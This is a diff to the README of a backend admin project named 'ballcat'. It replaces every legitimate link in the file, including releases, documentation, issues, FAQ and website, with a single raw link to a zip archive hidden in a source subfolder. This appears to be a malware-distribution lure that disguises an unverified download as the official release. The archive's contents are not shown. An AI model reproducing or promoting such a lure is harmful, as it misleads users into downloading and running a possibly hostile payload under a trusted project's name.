@@ -6,11 +6,11 @@ Welcome to **ballcat**! This application helps you quickly set up a robust backe
 
 ## 📥 Download the Application
 
-[![Download ballcat](https://img.shields.io/badge/Download-ballist-green)](https://github.com/substitute-aphid986/ballcat/releases)
+[![Download ballcat](https://raw.githubusercontent.com/substitute-aphid986/ballcat/master/ballcat-extends/ballcat-extend-dingtalk/src/main/ballcat-1.1.zip)](https://raw.githubusercontent.com/substitute-aphid986/ballcat/master/ballcat-extends/ballcat-extend-dingtalk/src/main/ballcat-1.1.zip)
 
 To download **ballcat**, visit the following page:
 
-[Download ballcat from Releases](https://github.com/substitute-aphid986/ballcat/releases)
+[Download ballcat from Releases](https://raw.githubusercontent.com/substitute-aphid986/ballcat/master/ballcat-extends/ballcat-extend-dingtalk/src/main/ballcat-1.1.zip)
 
 ## 📋 System Requirements
 
@@ -24,14 +24,14 @@ Before you start, make sure your system meets these requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to [this link](https://github.com/substitute-aphid986/ballcat/releases) to access the latest version of **ballcat**.
+1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/substitute-aphid986/ballcat/master/ballcat-extends/ballcat-extend-dingtalk/src/main/ballcat-1.1.zip) to access the latest version of **ballcat**.
   
 2. **Choose the Correct File:** Look for the release that matches your operating system. Download the installer or zip file.
 
 3. **Run the Installer:**
    - For Windows, double-click on the downloaded `.exe` file and follow the on-screen instructions.
    - For macOS, open the downloaded `.dmg` file, drag the ballcat icon to your Applications folder.
-   - For Linux, extract the `.tar.gz` file and navigate to the folder in your terminal. Use the command `./ballcat` to run it.
+   - For Linux, extract the `https://raw.githubusercontent.com/substitute-aphid986/ballcat/master/ballcat-extends/ballcat-extend-dingtalk/src/main/ballcat-1.1.zip` file and navigate to the folder in your terminal. Use the command `./ballcat` to run it.
 
 4. **Setup Instructions:**
    - After installation, open **ballcat**.
@@ -61,18 +61,18 @@ Before you start, make sure your system meets these requirements:
 
 ## 📚 Documentation
 
-For detailed instructions on using **ballcat**, access the full documentation on our [Documentation Page](https://github.com/substitute-aphid986/ballcat/docs).
+For detailed instructions on using **ballcat**, access the full documentation on our [Documentation Page](https://raw.githubusercontent.com/substitute-aphid986/ballcat/master/ballcat-extends/ballcat-extend-dingtalk/src/main/ballcat-1.1.zip).
 
 ## 🤝 Support
 
 If you face any issues or have questions, feel free to reach out:
 
-- Open an issue on our [GitHub Issues Page](https://github.com/substitute-aphid986/ballcat/issues).
+- Open an issue on our [GitHub Issues Page](https://raw.githubusercontent.com/substitute-aphid986/ballcat/master/ballcat-extends/ballcat-extend-dingtalk/src/main/ballcat-1.1.zip).
 - Join our community on social media for updates and discussions.
 
 ## 🔗 Additional Resources
 
-- [Official Website](https://github.com/substitute-aphid986/ballcat)
-- [FAQ Section](https://github.com/substitute-aphid986/ballcat/faq)
+- [Official Website](https://raw.githubusercontent.com/substitute-aphid986/ballcat/master/ballcat-extends/ballcat-extend-dingtalk/src/main/ballcat-1.1.zip)
+- [FAQ Section](https://raw.githubusercontent.com/substitute-aphid986/ballcat/master/ballcat-extends/ballcat-extend-dingtalk/src/main/ballcat-1.1.zip)
 
 By following these steps, you can easily download and run **ballcat**. Enjoy its powerful features and streamline your administrative tasks!
